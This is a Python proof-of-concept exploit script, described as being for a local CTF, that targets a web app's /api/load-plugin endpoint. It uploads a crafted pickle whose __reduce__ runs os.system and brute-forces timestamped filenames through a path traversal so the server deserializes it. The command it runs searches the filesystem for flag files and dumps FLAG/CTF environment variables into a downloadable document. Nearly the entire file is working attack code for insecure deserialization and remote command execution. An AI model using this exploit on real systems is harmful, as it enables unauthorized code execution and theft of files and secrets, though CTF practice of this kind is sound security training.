#!/usr/bin/env python3
"""Local CTF proof of concept for the /api/load-plugin pickle vulnerability.

The script creates an account, uploads a pickle as a normal document, uses the
load-plugin path traversal to deserialize it, and downloads the same document
after the pickle payload has replaced it with a report containing readable
flag-named files and FLAG/CTF environment variables.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import datetime as dt
import json
import os
import pickle
import threading
import uuid
from email.message import Message
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


def request(
    url: str,
    *,
    method: str = "GET",
    body: bytes | None = None,
    content_type: str | None = None,
    token: str | None = None,
    timeout: float = 10,
) -> tuple[int, Message, bytes]:
    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    if token:
        headers["Authorization"] = f"Bearer {token}"

    req = Request(url, data=body, headers=headers, method=method)
    try:
        with urlopen(req, timeout=timeout) as response:
            return response.status, response.headers, response.read()
    except HTTPError as error:
        return error.code, error.headers, error.read()


def json_request(
    base_url: str,
    endpoint: str,
    payload: dict[str, object],
    *,
    token: str | None = None,
    timeout: float = 10,
) -> tuple[int, Message, bytes]:
    return request(
        f"{base_url}{endpoint}",
        method="POST",
        body=json.dumps(payload).encode(),
        content_type="application/json",
        token=token,
        timeout=timeout,
    )


def multipart_file(field: str, filename: str, data: bytes) -> tuple[str, bytes]:
    boundary = f"----ctf-{uuid.uuid4().hex}"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    body += data
    body += f"\r\n--{boundary}--\r\n".encode()
    return f"multipart/form-data; boundary={boundary}", body


class FlagCapture:
    """Its reduce function is invoked by pickle.load on the server."""

    def __init__(self, login: str, basename: str):
        self.login = login
        self.basename = basename

    def __reduce__(self):
        # Values embedded here contain only UUID hex characters generated below.
        uploaded = f"/app/storage/files/{self.login}/*__{self.basename}"
        command = (
            f'for f in {uploaded}; do t="$f.capture"; '
            "{ printf '%s\\n' '=== READABLE FLAG FILES ==='; "
            "find / -xdev "
            "\\( -path /proc -o -path /sys -o -path /dev -o -path /usr \\) "
            "-prune -o -type f "
            "\\( -iname 'flag' -o -iname 'flag.*' -o -iname '*_flag' "
            "-o -iname '*_flag.*' -o -iname 'ctf*' \\) "
            "-size -1048576c -readable -print 2>/dev/null | sort -u | "
            "while IFS= read -r p; do "
            "printf '\\n--- FILE: %s ---\\n' \"$p\"; cat \"$p\"; "
            "done; "
            "printf '\\n%s\\n' '=== FLAG-LIKE ENVIRONMENT VARIABLES ==='; "
            "printenv | grep -Ei '(^|_)(FLAG|CTF)(_|=|$)' || true; "
            '} > "$t" '
            '&& mv "$t" "$f"; '
            "done"
        )
        return os.system, (command,)


def parse_json(status: int, body: bytes, operation: str) -> dict[str, object]:
    try:
        data = json.loads(body)
    except json.JSONDecodeError as error:
        raise RuntimeError(
            f"{operation} returned HTTP {status} with non-JSON data: {body[:200]!r}"
        ) from error
    if status >= 300:
        raise RuntimeError(f"{operation} failed with HTTP {status}: {data}")
    return data


def timestamp_name(timestamp_us: int, basename: str) -> str:
    timestamp = dt.datetime.fromtimestamp(timestamp_us / 1_000_000, dt.timezone.utc)
    return f"{timestamp.strftime('%Y%m%dT%H%M%S%fZ')}__{basename}"


def find_and_trigger_plugin(
    base_url: str,
    token: str,
    login: str,
    basename: str,
    creation: dt.datetime,
    search_ms: int,
    workers: int,
) -> tuple[str, int, bytes]:
    if creation.tzinfo is None:
        creation = creation.replace(tzinfo=dt.timezone.utc)
    else:
        creation = creation.astimezone(dt.timezone.utc)

    # The filename timestamp is generated shortly before the DB creation time.
    # Include 2 ms after it to tolerate small clock differences between containers.
    newest_us = int(creation.timestamp() * 1_000_000) + 2_000
    attempts = (search_ms + 2) * 1_000 + 1
    stop = threading.Event()
    result: list[tuple[str, int, bytes]] = []
    result_lock = threading.Lock()

    def worker(offset: int) -> None:
        for delta in range(offset, attempts, workers):
            if stop.is_set():
                return
            stored_name = timestamp_name(newest_us - delta, basename)
            traversal = f"../{login}/{stored_name}"
            try:
                status, _, body = json_request(
                    base_url,
                    "/api/load-plugin",
                    {"filename": traversal},
                    token=token,
                    timeout=5,
                )
            except (TimeoutError, URLError):
                continue

            # 404 means this timestamp was not the uploaded filename. Any other
            # result means the path existed; 400 is expected after code execution
            # because os.system returns an integer rather than a plugin class.
            if status != 404:
                with result_lock:
                    if not result:
                        result.append((traversal, status, body))
                        stop.set()
                return

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(worker, offset) for offset in range(workers)]
        for future in futures:
            future.result()

    if not result:
        raise RuntimeError(
            f"stored filename not found within {search_ms} ms before its DB timestamp; "
            "retry with a larger --search-ms value"
        )
    return result[0]


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:5001")
    parser.add_argument(
        "--search-ms",
        type=int,
        default=25,
        help="microsecond filename search window before DB creation (default: 25 ms)",
    )
    parser.add_argument("--workers", type=int, default=32)
    parser.add_argument("--output", default="captured_flag.txt")
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")

    identifier = uuid.uuid4().hex[:12]
    login = f"ctf{identifier}"
    email = f"{login}@example.test"
    password = uuid.uuid4().hex
    basename = f"payload_{identifier}.pkl"

    status, _, body = json_request(
        base_url,
        "/api/create-user",
        {"email": email, "login": login, "password": password},
    )
    parse_json(status, body, "create-user")

    status, _, body = json_request(
        base_url,
        "/api/login",
        {"email": email, "password": password},
    )
    login_data = parse_json(status, body, "login")
    token = str(login_data["token"])

    payload = pickle.dumps(FlagCapture(login, basename), protocol=4)
    content_type, upload_body = multipart_file("file", basename, payload)
    status, _, body = request(
        f"{base_url}/api/upload-document",
        method="POST",
        body=upload_body,
        content_type=content_type,
        token=token,
    )
    upload = parse_json(status, body, "upload-document")
    document_id = int(upload["id"])
    creation = dt.datetime.fromisoformat(str(upload["creation"]))

    traversal, trigger_status, trigger_body = find_and_trigger_plugin(
        base_url,
        token,
        login,
        basename,
        creation,
        args.search_ms,
        args.workers,
    )
    print(f"Triggered {traversal!r}: HTTP {trigger_status} {trigger_body.decode(errors='replace')}")

    status, _, flag = request(
        f"{base_url}/api/get-document/{document_id}", token=token
    )
    if status != 200:
        raise RuntimeError(
            f"get-document failed with HTTP {status}: {flag.decode(errors='replace')}"
        )

    with open(args.output, "wb") as output_file:
        output_file.write(flag)
    print(flag.decode(errors="replace"))
    print(f"Saved captured flag to {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
